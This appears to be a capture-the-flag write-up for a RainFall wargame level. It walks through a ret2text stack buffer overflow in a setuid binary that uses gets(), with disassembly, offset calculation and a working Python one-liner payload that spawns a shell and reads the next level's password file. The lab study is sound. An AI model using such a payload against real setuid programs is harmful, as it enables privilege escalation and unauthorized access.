# LEVEL 1 - Stack Buffer Overflow (ret2text)

> Vulnerability class: Stack Buffer Overflow - ret2text
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

The program reads user input via `gets()` into a fixed-size stack buffer with no bounds checking. By overflowing the buffer to overwrite the saved return address (EIP), we redirect execution to an unused `run()` function that spawns a privileged shell.

---

## 1. Reconnaissance

```bash
   ~$ file level1 
   level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: the binary resolves library functions (like `system()`) at runtime via the PLT/GOT mechanism

---

## 2. Dynamic Analysis 

Running the binary shows it reads from stdin and exits silently — no visible output, no crash:
```bash
   level1@RainFall:~$ ./level1 
   test
   level1@RainFall:~$ ./level1 toto
   test
```

No useful information surfaces at runtime alone. We move to static analysis.

---

## 3. Static Analysis

### 3.1 Identifying the vulnerability in `main`

Disassembling `main` in GDB reveals the input handling logic:
```asm
   [...]
   0x08048483 <+3>:     and    $0xfffffff0,%esp       ; align stack to 16 bytes
   0x08048486 <+6>:     sub    $0x50,%esp             ; reserves 80 bytes on the stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax        ; buffer starts at esp+0x10 (16 bytes offset) on the stack
   0x0804848d <+13>:    mov    %eax,(%esp)            ; pass buffer address as argument
   0x08048490 <+16>:    call   0x8048340 <gets@plt>   ; unbounded read into buffer
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret                           ; <-- return address we will overwrite
```
The effective buffer size is `80 - 16 = 64 bytes`. `gets()` writes past this with no size check, allowing us to overwrite the saved EIP on the stack.


### 3.2 Locating the target function

`objdump` reveals a function `run()` that is never called from `main`:
```bash
level1@RainFall:~$ objdump -D ./level1 
08048444 <run>:
   [...]
   804846a:       89 04 24                mov    %eax,(%esp)
   804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>   ; prints "Good... Wait what?"
   8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
   8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>   ; <-- spawn a shell
   804847e:       c9                      leave  
   804847f:       c3                      ret 
[...]
```

Inspecting the argument passed to `system()`:

```bash
   (gdb) x/s 0x8048584
   0x8048584:       "/bin/sh"
```

`run()` at `0x08048444` is our target.

---

## 4. Vulnerability

Root cause:`gets()` performs no bounds checking, it reads from stdin until a newline or EOF, regardless of the destination buffer size. The C standard has deprecated this function for this exact reason.

Attack primitive: By writing past the 64-byte buffer, we overwrite the saved frame pointer (EBP) and then the saved return address (EIP) on the stack. When `main` executes `ret`, EIP is loaded from the stack, giving us control of the instruction pointer.

Impact: Full control of the instruction pointer -> arbitrary code redirection -> privilege escalation via the setuid bit.

---

## 5. Exploitation

### 5.1 Offset calculation

The stack layout at the point of the `gets()` call:
```txt
   [ 16 bytes padding ][ 64 bytes buffer ][ 4 bytes saved EBP ][ 4 bytes saved EIP ]
```

Total bytes to reach saved EIP: `16 + 64 + 4 (saved EBP) = 76`

Confirmed with GDB:
```bash
   (gdb) run < <(python -c 'print "A" * 80')
   Starting program: /home/user/level1/level1 < <(python -c 'print "A" * 80')
   Program received signal SIGSEGV, Segmentation fault.
   0x41414141 in ?? ()
   (gdb) info registers eip
   eip            0x41414141       0x41414141      ; EIP fully overwritten with our "A"s
```

### 5.2 Building the payload

```txt
   [ 76 bytes padding ] + [ address of run() in little-endian ]
```
`run` is at `0x048444`. In little-endian (x86), this is written as `\x44\x84\x04\x08`.

### 5.3 Executing the exploit

```bash
   level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1 
   Good... Wait what?
   whoami
   level2
   cat /home/user/level2/.pass        
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

The `cat` command keeps sdtin open after the Python script exists. Without it, the shell spawned by `system()` would receive EOF immediately and close.

---

## 6. Key Takeaways

| Concept | Detail |
|---|---|
| `gets()` is unsafe | No bounds check — never use in production; replace with `fgets()` |
| Stack layout matters | Understanding frame size and offsets is essential to calculate overflow padding |
| ret2text | Redirecting EIP to existing code (`.text` section) requires no shellcode injection |
| Little-endian addressing | x86 stores multi-byte values LSB first — addresses must be reversed in payloads |
| `cat` stdin trick | Keeps the pipe open so the spawned shell can receive further input |
